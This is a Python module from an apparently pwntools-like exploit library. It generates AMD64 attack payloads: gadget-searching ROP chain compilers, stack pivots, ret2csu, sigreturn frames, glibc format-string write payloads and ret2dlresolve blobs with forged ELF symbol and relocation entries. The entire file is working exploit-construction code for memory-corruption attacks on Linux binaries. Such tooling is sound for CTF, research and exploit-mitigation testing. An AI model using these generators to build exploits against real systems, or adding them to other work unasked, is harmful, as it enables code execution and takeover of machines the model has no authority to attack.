"""Native AMD64 exploit lowering helpers.

These are deterministic compilers. They do not communicate with targets or
discover vulnerabilities; they lower declared effects into payloads.
"""

from __future__ import annotations

from dataclasses import dataclass
import itertools
import struct
from typing import Any, Iterable, Mapping, Sequence, Set

from .abi import TargetABI, target_abi
from .errors import ArtifactError, ConstraintError, PlanningError, UnsupportedFeature
from .packing import Packed
from .payload import Payload
from .expressions import Call, as_expr


_ARGUMENT_REGISTERS = ("rdi", "rsi", "rdx", "rcx", "r8", "r9")
_POP_OPCODES = {
    "rax": b"\x58",
    "rcx": b"\x59",
    "rdx": b"\x5a",
    "rbx": b"\x5b",
    "rsp": b"\x5c",
    "rbp": b"\x5d",
    "rsi": b"\x5e",
    "rdi": b"\x5f",
    "r8": b"\x41\x58",
    "r9": b"\x41\x59",
    "r10": b"\x41\x5a",
    "r11": b"\x41\x5b",
    "r12": b"\x41\x5c",
    "r13": b"\x41\x5d",
    "r14": b"\x41\x5e",
    "r15": b"\x41\x5f",
}


@dataclass(frozen=True, slots=True)
class _CheckedWord:
    value: Any
    maximum: int
    reason: str
    size: int = 8

    @property
    def dependencies(self) -> set[str]:
        return set(getattr(self.value, "dependencies", ()))

    def build(self, context=None) -> bytes:
        value = self.value
        if not isinstance(value, int):
            if context is None:
                raise ConstraintError(
                    f"{self.reason} requires a BindingContext for symbolic validation"
                )
            value = context.resolve(value)
        if hasattr(value, "value"):
            value = value.value
        if not isinstance(value, int) or isinstance(value, bool):
            raise ConstraintError(f"{self.reason} resolved to non-integer {value!r}")
        if not 0 <= value <= self.maximum:
            raise ConstraintError(self.reason)
        return value.to_bytes(8, "little")

    def describe(self) -> str:
        return self.reason


def _first(values: Any) -> Any:
    if isinstance(values, int):
        return values
    if isinstance(values, (list, tuple)):
        if not values:
            raise PlanningError("search returned no addresses")
        return values[0]
    try:
        return next(iter(values))
    except (TypeError, StopIteration) as exc:
        raise PlanningError("search returned no addresses") from exc


def _image_address(image: Any, virtual_address: int, *, label: str | None = None) -> Any:
    address = getattr(image, "address", None)
    if callable(address):
        try:
            return address(virtual_address, label=label)
        except TypeError:
            return address(virtual_address)
    return as_expr(virtual_address)


def _section_field(section: Any, *names: str) -> int:
    for name in names:
        if isinstance(section, Mapping) and name in section:
            return int(section[name])
        if hasattr(section, name):
            return int(getattr(section, name))
        header = getattr(section, "header", None)
        if header is not None:
            if isinstance(header, Mapping) and name in header:
                return int(header[name])
            if hasattr(header, name):
                return int(getattr(header, name))
    raise PlanningError(f"section lacks required field {names[0]}")


def _dynamic_value(image: Any, tag: int, name: str) -> int:
    dynamic = getattr(image, "dynamic", {})
    if tag in dynamic:
        return int(dynamic[tag])
    if name in dynamic:
        return int(dynamic[name])
    lookup = getattr(image, "dynamic_value_by_tag", None)
    if callable(lookup):
        value = lookup(name)
        if value is not None:
            return int(value)
    raise PlanningError(f"ELF is missing required dynamic tag {name}")


def _search(image: Any, needle: bytes, *, executable: bool = False) -> int:
    search = getattr(image, "search", None)
    if not callable(search):
        raise PlanningError(f"{getattr(image, 'name', 'image')} does not support byte search")
    try:
        result = search(needle, executable=executable)
    except TypeError:
        result = search(needle)
    return int(_first(result))


def _call_parts(call: Any) -> tuple[Any, tuple[Any, ...]]:
    target = getattr(call, "target", None)
    args = getattr(call, "args", None)
    if target is None or args is None:
        raise TypeError("ROPCompiler.call expects an expressions.Call")
    return target, tuple(args)


class ROPCompiler:
    """Compile simple SysV AMD64 calls from exact executable gadgets."""

    def __init__(self, images: Any | Sequence[Any]) -> None:
        if isinstance(images, (str, bytes)):
            raise TypeError("ROPCompiler requires Image objects, not paths")
        if isinstance(images, Sequence):
            supplied = tuple(images)
        else:
            supplied = (images,)
        if not supplied:
            raise ValueError("ROPCompiler requires at least one image")
        # Prefer fixed images when a gadget exists in both the executable and a
        # relocated library. This avoids introducing a needless runtime-base
        # dependency while preserving the caller's order within each class.
        self.images = tuple(
            image
            for _, image in sorted(
                enumerate(supplied),
                key=lambda pair: (bool(getattr(pair[1], "relocatable", False)), pair[0]),
            )
        )

    def _gadget(self, code: bytes, label: str) -> Any:
        for image in self.images:
            try:
                address = _search(image, code, executable=True)
            except PlanningError:
                continue
            return _image_address(image, address, label=label)
        raise PlanningError(f"no usable {label} gadget was found")

    def find_gadget(self, *instructions: str) -> Any:
        """Resolve a small exact AMD64 gadget by readable instructions."""

        encoded = bytearray()
        for instruction in instructions:
            normalized = " ".join(instruction.lower().strip().split())
            if normalized == "ret":
                encoded.extend(b"\xc3")
            elif normalized == "leave":
                encoded.extend(b"\xc9")
            elif normalized == "syscall":
                encoded.extend(b"\x0f\x05")
            elif normalized.startswith("pop "):
                register = normalized[4:]
                try:
                    encoded.extend(_POP_OPCODES[register])
                except KeyError as error:
                    raise UnsupportedFeature(
                        f"unsupported AMD64 gadget instruction {instruction!r}"
                    ) from error
            else:
                raise UnsupportedFeature(
                    f"unsupported AMD64 gadget instruction {instruction!r}"
                )
        return self._gadget(bytes(encoded), "; ".join(instructions))

    def _pop(self, register: str) -> Any:
        try:
            opcode = _POP_OPCODES[register]
        except KeyError as exc:
            raise UnsupportedFeature(f"unsupported AMD64 register {register}") from exc
        return self._gadget(opcode + b"\xc3", f"pop {register}; ret")

    def _pop_with_extras(self, register: str) -> tuple[Any, tuple[str, ...]]:
        try:
            return self._pop(register), ()
        except PlanningError:
            pass
        others = tuple(name for name in _POP_OPCODES if name != register)
        for count in (1, 2):
            for extras in itertools.permutations(others, count):
                code = (
                    _POP_OPCODES[register]
                    + b"".join(_POP_OPCODES[name] for name in extras)
                    + b"\xc3"
                )
                try:
                    address = self._gadget(
                        code,
                        "; ".join(
                            [f"pop {register}", *(f"pop {name}" for name in extras), "ret"]
                        ),
                    )
                except PlanningError:
                    continue
                return address, extras
        raise PlanningError(
            f"no usable gadget starts with pop {register} and returns"
        )

    def _ret(self) -> Any:
        return self._gadget(b"\xc3", "ret")

    def _syscall_ret(self) -> Any:
        return self._gadget(b"\x0f\x05\xc3", "syscall; ret")

    def _cstring(self, value: str | bytes) -> Any:
        needle = value.encode() if isinstance(value, str) else bytes(value)
        if not needle.endswith(b"\x00"):
            needle += b"\x00"
        for image in self.images:
            try:
                address = _search(image, needle)
            except PlanningError:
                continue
            return _image_address(image, address, label=f"cstring {needle[:-1]!r}")
        raise PlanningError(
            f"no image contains {needle!r}; declare writable string storage or a write recipe"
        )

    def _argument(self, value: Any) -> Any:
        if isinstance(value, (str, bytes)):
            return self._cstring(value)
        if getattr(value, "is_literal", False) and getattr(value, "kind", None) in {
            "string",
            "bytes",
        }:
            return self._cstring(value.value)
        return as_expr(value)

    def _register_chain(self, assignments: Iterable[tuple[str, Any]]) -> Payload:
        requested = dict(assignments)
        specifications = {
            register: self._pop_with_extras(register) for register in requested
        }
        dependencies = {
            register: {extra for extra in extras if extra in requested}
            for register, (_address, extras) in specifications.items()
        }
        order: list[str] = []
        remaining = list(requested)
        while remaining:
            ready = [
                register
                for register in remaining
                if not any(
                    register in dependencies[other]
                    for other in remaining
                    if other != register
                )
            ]
            if not ready:
                raise PlanningError(
                    "available multi-pop gadgets create a register-clobber cycle"
                )
            selected = ready[0]
            order.append(selected)
            remaining.remove(selected)

        payload = Payload()
        for register in order:
            gadget, extras = specifications[register]
            description = "; ".join(
                [f"pop {register}", *(f"pop {name}" for name in extras), "ret"]
            )
            payload.word(gadget, label=description)
            payload.word(self._argument(requested[register]), label=f"{register} value")
            for extra in extras:
                payload.word(
                    0xDEAD_0000_0000_0000 | len(payload),
                    label=f"padding for popped {extra}",
                )
        return payload

    def registers(
        self,
        assignments: Mapping[str, Any],
        *,
        forbidden: bytes = b"",
    ) -> Payload:
        """Compile a register goal with labelled multi-pop padding."""

        payload = self._register_chain(assignments.items())
        payload.forbidden = bytes(
            sorted(set(payload.forbidden) | set(forbidden))
        )
        return payload

    def pivot(self, stack: Any, *, forbidden: bytes = b"") -> Payload:
        payload = Payload(forbidden=forbidden)
        payload.word(self._pop("rbp"), label="pop rbp; ret")
        payload.word(stack, label="new frame pointer")
        payload.word(self._gadget(b"\xc9\xc3", "leave; ret"), label="leave; ret")
        return payload

    def migrate(self, stack: Any, *, forbidden: bytes = b"") -> Payload:
        payload = Payload(forbidden=forbidden)
        try:
            gadget = self._gadget(b"\x5c\xc3", "pop rsp; ret")
        except PlanningError:
            return self.pivot(stack, forbidden=forbidden)
        payload.word(gadget, label="pop rsp; ret")
        payload.word(stack, label="new stack pointer")
        return payload

    def ret2csu(
        self,
        call_pointer: Any,
        *,
        rdi: Any = 0,
        rsi: Any = 0,
        rdx: Any = 0,
        continuation: Any | None = None,
        forbidden: bytes = b"",
    ) -> Payload:
        """Compile the common AMD64 __libc_csu_init indirect-call sequence."""

        if isinstance(rdi, int) and not 0 <= rdi <= 0xFFFF_FFFF:
            raise ConstraintError(
                "the standard ret2csu gadget writes edi and truncates rdi to 32 bits"
            )
        pop_gadget = self._gadget(
            b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3",
            "csu pop rbx, rbp, r12, r13, r14, r15; ret",
        )
        call_sequence = (
            b"\x4c\x89\xfa"          # mov rdx, r15
            b"\x4c\x89\xf6"          # mov rsi, r14
            b"\x44\x89\xef"          # mov edi, r13d
            b"\x41\xff\x14\xdc"      # call [r12 + rbx*8]
            b"\x48\x83\xc3\x01"      # add rbx, 1
            b"\x48\x39\xeb"          # cmp rbp, rbx
            b"\x75\xea"              # jne call loop
            b"\x48\x83\xc4\x08"      # add rsp, 8
            b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3"
        )
        call_gadget = self._gadget(
            call_sequence,
            "complete csu argument move, call loop, and cleanup",
        )
        payload = Payload(forbidden=forbidden)
        payload.word(pop_gadget, label="ret2csu register loader")
        payload.word(0, label="rbx = 0")
        payload.word(1, label="rbp = 1 (single call)")
        payload.word(call_pointer, label="r12 = indirect call table")
        payload.append(
            _CheckedWord(
                rdi,
                0xFFFF_FFFF,
                "ret2csu writes edi; rdi must resolve within 32 bits",
            ),
            label="r13 -> edi (validated 32-bit)",
        )
        payload.word(rsi, label="r14 -> rsi")
        payload.word(rdx, label="r15 -> rdx")
        payload.word(call_gadget, label="ret2csu indirect call")
        payload.word(0, label="ret2csu add rsp, 8 padding")
        for register in ("rbx", "rbp", "r12", "r13", "r14", "r15"):
            payload.word(0, label=f"ret2csu restore {register} padding")
        if continuation is not None:
            payload.word(continuation, label="ret2csu continuation")
        return payload

    @staticmethod
    def _validate_entry_alignment(entry_sp_mod16: int) -> int:
        if not isinstance(entry_sp_mod16, int) or not 0 <= entry_sp_mod16 < 16:
            raise ValueError("entry_sp_mod16 must be an integer in range(16)")
        if entry_sp_mod16 not in (0, 8):
            raise PlanningError(
                "a qword ROP chain can only repair stack alignment modulo 8; "
                f"received rsp%16={entry_sp_mod16}"
            )
        return entry_sp_mod16

    def call(
        self,
        call: Any,
        *,
        resume: Any | None = None,
        entry_sp_mod16: int = 0,
        forbidden: bytes = b"",
    ) -> Payload:
        target, args = _call_parts(call)
        if len(args) > len(_ARGUMENT_REGISTERS):
            raise UnsupportedFeature("AMD64 SysV calls with more than six arguments need stack args")
        current_mod = self._validate_entry_alignment(entry_sp_mod16)
        payload = Payload(forbidden=forbidden)
        if current_mod != 8:
            payload.word(self._ret(), label="ABI alignment ret")
        payload.append(
            self._register_chain(zip(_ARGUMENT_REGISTERS, args, strict=False))
        )
        payload.word(target, label=getattr(call, "name", None) or "call target")
        if resume is not None:
            payload.word(resume, label="return continuation")
        return payload

    def syscall(
        self,
        number: Any,
        args: Sequence[Any] = (),
        *,
        resume: Any | None = None,
        entry_sp_mod16: int = 0,
        forbidden: bytes = b"",
    ) -> Payload:
        if len(args) > 6:
            raise UnsupportedFeature("Linux AMD64 syscalls have at most six arguments")
        registers = ("rdi", "rsi", "rdx", "r10", "r8", "r9")
        self._validate_entry_alignment(entry_sp_mod16)
        payload = Payload(forbidden=forbidden)
        assignments = [("rax", number)]
        assignments.extend(zip(registers, args, strict=False))
        payload.append(self._register_chain(assignments))
        payload.word(self._syscall_ret(), label="syscall; ret")
        if resume is not None:
            payload.word(resume, label="syscall continuation")
        return payload


class SigreturnFrame:
    """Encode a versioned target-ABI rt_sigreturn schema."""

    def __init__(
        self,
        *,
        abi: str | TargetABI = "linux-amd64",
        **registers: Any,
    ) -> None:
        selected = target_abi(abi)
        schema = selected.schema("rt_sigreturn")
        object.__setattr__(self, "_abi", selected)
        object.__setattr__(self, "_schema", schema)
        object.__setattr__(self, "_values", {item.name: 0 for item in schema.fields})
        self._values["csgsfs"] = 0x33
        for name, value in registers.items():
            self.set(name, value)

    def set(self, register: str, value: Any) -> "SigreturnFrame":
        if register not in self._values:
            raise AttributeError(
                f"unknown {self._abi.name} rt_sigreturn field {register!r}"
            )
        self._values[register] = value
        return self

    def __setattr__(self, name: str, value: Any) -> None:
        if name in {"_abi", "_schema", "_values"}:
            object.__setattr__(self, name, value)
        else:
            self.set(name, value)

    def __getattr__(self, name: str) -> Any:
        if name in self._values:
            return self._values[name]
        raise AttributeError(name)

    @property
    def abi(self) -> TargetABI:
        return self._abi

    @property
    def size(self) -> int:
        return self._schema.size

    @property
    def dependencies(self) -> Set[str]:
        result: Set[str] = set()
        for value in self._values.values():
            dependencies = getattr(value, "dependencies", ())
            if callable(dependencies):
                dependencies = dependencies()
            result.update(dependencies)
        return result

    def payload(self, context: Any | None = None) -> Payload:
        payload = Payload(fill=b"\x00")
        for item in self._schema.fields:
            assert item.codec.size is not None
            payload.place(
                item.offset,
                Packed(
                    self._values[item.name],
                    item.codec.size * 8,
                    self._abi.endian,
                    signed=False,
                    label=f"sigcontext.{item.name}",
                ),
                label=f"sigcontext.{item.name}",
                encoded=True,
            )
        return payload

    def build(self, context: Any | None = None) -> bytes:
        return self.payload(context).build(context)

    def __bytes__(self) -> bytes:
        return self.build()

    def __len__(self) -> int:
        return self.size

    def layout(self, context: Any | None = None) -> list[dict[str, Any]]:
        return self.payload(context).layout(context)


def _normalize_writes(
    writes: Mapping[int, int | bytes],
    unit: int,
    pointer_size: int,
) -> list[tuple[int, int, int]]:
    bytes_by_address: dict[int, int] = {}
    for address, value in writes.items():
        if address < 0:
            raise ValueError("format-string write addresses must be non-negative")
        if isinstance(value, int):
            if not 0 <= value < 1 << (pointer_size * 8):
                raise ConstraintError(f"format-string value {value:#x} exceeds pointer size")
            raw = value.to_bytes(pointer_size, "little")
        elif isinstance(value, bytes):
            raw = value
        else:
            raise TypeError("format-string writes must contain int or bytes values")
        for index, byte in enumerate(raw):
            destination = address + index
            if destination in bytes_by_address and bytes_by_address[destination] != byte:
                raise ConstraintError(f"conflicting format writes at {destination:#x}")
            bytes_by_address[destination] = byte
    ordered = sorted(bytes_by_address)
    atoms: list[tuple[int, int, int]] = []
    index = 0
    while index < len(ordered):
        start = ordered[index]
        if (
            unit == 2
            and index + 1 < len(ordered)
            and ordered[index + 1] == start + 1
        ):
            value = bytes_by_address[start] | (bytes_by_address[start + 1] << 8)
            atoms.append((start, value, 2))
            index += 2
        else:
            atoms.append((start, bytes_by_address[start], 1))
            index += 1
    return atoms


def fmtstr_payload(
    offset: int,
    writes: Mapping[int, int | bytes],
    *,
    numbwritten: int = 0,
    write_size: str = "short",
    pointer_size: int = 8,
    badbytes: bytes = b"",
    prefix: bytes = b"",
) -> bytes:
    """Generate a positional glibc printf write payload."""

    if offset <= 0:
        raise ValueError("format-string offset must be positive")
    if pointer_size not in (4, 8):
        raise ValueError("pointer_size must be 4 or 8")
    units = {"byte": 1, "short": 2}
    if write_size not in units:
        raise ValueError("write_size must be 'byte' or 'short'")
    atoms = _normalize_writes(writes, units[write_size], pointer_size)
    for address, _, _ in atoms:
        raw_address = address.to_bytes(pointer_size, "little")
        if set(raw_address) & set(badbytes):
            raise ConstraintError(f"format-string target {address:#x} contains a bad byte")

    atoms.sort(key=lambda atom: (atom[1], atom[2], atom[0]))
    argument_base = offset
    for _ in range(32):
        counter = numbwritten + len(prefix)
        directives = bytearray(prefix)
        for index, (_, desired, size) in enumerate(atoms):
            modulus = 1 << (size * 8)
            padding = (desired - counter) % modulus
            if padding:
                if padding <= 3:
                    directives.extend(b"A" * padding)
                else:
                    directives.extend(f"%{padding}c".encode())
                counter += padding
            specifier = "hhn" if size == 1 else "hn"
            directives.extend(("%%%d$%s" % (argument_base + index, specifier)).encode())
        aligned_size = (len(directives) + pointer_size - 1) // pointer_size * pointer_size
        new_base = offset + aligned_size // pointer_size
        if new_base == argument_base:
            directives.extend(b"A" * (aligned_size - len(directives)))
            payload = bytes(directives) + b"".join(
                address.to_bytes(pointer_size, "little") for address, _, _ in atoms
            )
            violations = sorted(set(payload) & set(badbytes))
            if violations:
                rendered = ", ".join(f"{byte:#04x}" for byte in violations)
                raise ConstraintError(
                    f"generated format-string payload contains bad byte(s): {rendered}"
                )
            return payload
        argument_base = new_base
    raise PlanningError("format-string argument placement did not converge")


@dataclass(frozen=True, slots=True)
class DlResolvePayload:
    first_stage: Payload
    data: bytes
    data_addr: int
    resolution_addr: int
    reloc_index: int
    argument_values: tuple[Any, ...]
    reliable: bool
    notes: tuple[str, ...] = ()

    @property
    def payload(self) -> bytes:
        return self.data


def _align_relative(address: int, origin: int, alignment: int) -> int:
    delta = address - origin
    if delta < 0:
        raise PlanningError("ret2dlresolve staging address precedes a required ELF table")
    return origin + (delta + alignment - 1) // alignment * alignment


def _mapped(image: Any, address: int, size: int = 1) -> bool:
    for segment in getattr(image, "segments", ()):
        try:
            if isinstance(segment, Mapping):
                start_value = segment.get("vaddr", segment.get("p_vaddr"))
                size_value = segment.get("memsz", segment.get("p_memsz"))
            else:
                start_value = getattr(segment, "vaddr", getattr(segment, "p_vaddr", None))
                size_value = getattr(segment, "memsz", getattr(segment, "p_memsz", None))
            start = int(start_value)
            memory_size = int(size_value)
        except (TypeError, ValueError):
            continue
        if start <= address and address + size <= start + memory_size:
            return True
    return False


def _default_data_address(image: Any) -> int:
    section = image.section(".bss")
    start = _section_field(section, "addr", "sh_addr")
    size = _section_field(section, "size", "sh_size")
    end = start + size
    return ((end + 0xFFF) & ~0xFFF) - 0x200


def _plt0(image: Any) -> int:
    explicit = getattr(image, "plt0", None)
    if explicit is not None:
        return int(explicit)
    for name in (".plt", ".plt.sec"):
        try:
            section = image.section(name)
        except (ArtifactError, KeyError, PlanningError):
            continue
        return _section_field(section, "addr", "sh_addr")
    raise PlanningError("ELF has no PLT section required for ret2dlresolve")


def build_dlresolve(
    image: Any,
    symbol: str,
    args: Sequence[Any],
    *,
    data_addr: int | None = None,
    resolution_addr: int | None = None,
    read_symbol: str = "read",
    entry_sp_mod16: int = 0,
    forbidden: bytes = b"",
) -> DlResolvePayload:
    """Build an AMD64 ret2dlresolve blob and its staging ROP chain."""

    if getattr(image, "pointer_size", 8) != 8:
        raise UnsupportedFeature("ret2dlresolve currently supports AMD64 ELF only")
    if getattr(image, "relocatable", False):
        raise UnsupportedFeature(
            "PIE ret2dlresolve needs a concrete process base; this builder accepts "
            "non-PIE images only"
        )
    if not symbol or "\x00" in symbol:
        raise ValueError("dynamic symbol name must be non-empty and contain no NUL")

    strtab = _dynamic_value(image, 5, "DT_STRTAB")
    symtab = _dynamic_value(image, 6, "DT_SYMTAB")
    jmprel = _dynamic_value(image, 23, "DT_JMPREL")
    try:
        versym: int | None = _dynamic_value(image, 0x6FFFFFF0, "DT_VERSYM")
    except PlanningError:
        versym = None
    dynamic = getattr(image, "dynamic", {})
    sym_ent = dynamic.get(11, dynamic.get("DT_SYMENT", 24))
    rel_ent = dynamic.get(9, dynamic.get("DT_RELAENT", 24))
    if int(sym_ent) != 24 or int(rel_ent) != 24:
        raise UnsupportedFeature("unexpected AMD64 ELF symbol or relocation entry size")

    data_addr = _default_data_address(image) if data_addr is None else int(data_addr)
    resolution_addr = data_addr if resolution_addr is None else int(resolution_addr)
    symbol_name = symbol.encode() + b"\x00"
    symbol_name_addr = data_addr
    symbol_end = symbol_name_addr + len(symbol_name)
    sym_addr = _align_relative(symbol_end, symtab, 24)
    sym_index = (sym_addr - symtab) // 24
    rel_addr = _align_relative(sym_addr + 24, jmprel, 24)
    reloc_index = (rel_addr - jmprel) // 24

    st_name = symbol_name_addr - strtab
    if not 0 <= st_name < 1 << 32:
        raise PlanningError("fake symbol name is outside the ELF64 st_name range")
    fake_sym = struct.pack("<IBBHQQ", st_name, 0x12, 0, 0, 0, 0)
    fake_rela = struct.pack(
        "<QQq",
        resolution_addr,
        (sym_index << 32) | 7,
        0,
    )

    data = bytearray(b"\x00" * (rel_addr + 24 - data_addr))
    data[0 : len(symbol_name)] = symbol_name
    data[sym_addr - data_addr : sym_addr - data_addr + 24] = fake_sym
    data[rel_addr - data_addr : rel_addr - data_addr + 24] = fake_rela

    argument_values: list[Any] = []
    for argument in args:
        if isinstance(argument, str):
            argument = argument.encode()
        if isinstance(argument, bytes):
            raw = argument if argument.endswith(b"\x00") else argument + b"\x00"
            argument_values.append(data_addr + len(data))
            data.extend(raw)
        else:
            argument_values.append(argument)

    notes: list[str] = []
    reliable = True
    if versym is not None:
        version_address = versym + sym_index * 2
        if not _mapped(image, version_address, 2):
            reliable = False
            notes.append(
                f"version entry {version_address:#x} is outside a mapped segment; "
                "the dynamic linker may fault"
            )
    if not _mapped(image, data_addr, len(data)):
        notes.append(
            "staging blob extends outside an existing mapped segment; ensure the "
            "chosen address is writable at runtime"
        )

    compiler = ROPCompiler(image)
    read_call = image.call(read_symbol, 0, data_addr, len(data))
    first_stage = compiler.call(
        read_call,
        entry_sp_mod16=entry_sp_mod16,
        forbidden=forbidden,
    )
    resolver_call = Call(
        as_expr(_image_address(image, _plt0(image), label="PLT0")),
        tuple(argument_values),
    )
    first_stage.append(
        compiler.call(
            resolver_call,
            resume=reloc_index,
            entry_sp_mod16=0,
            forbidden=forbidden,
        )
    )

    return DlResolvePayload(
        first_stage=first_stage,
        data=bytes(data),
        data_addr=data_addr,
        resolution_addr=resolution_addr,
        reloc_index=reloc_index,
        argument_values=tuple(argument_values),
        reliable=reliable,
        notes=tuple(notes),
    )


dlresolve = build_dlresolve
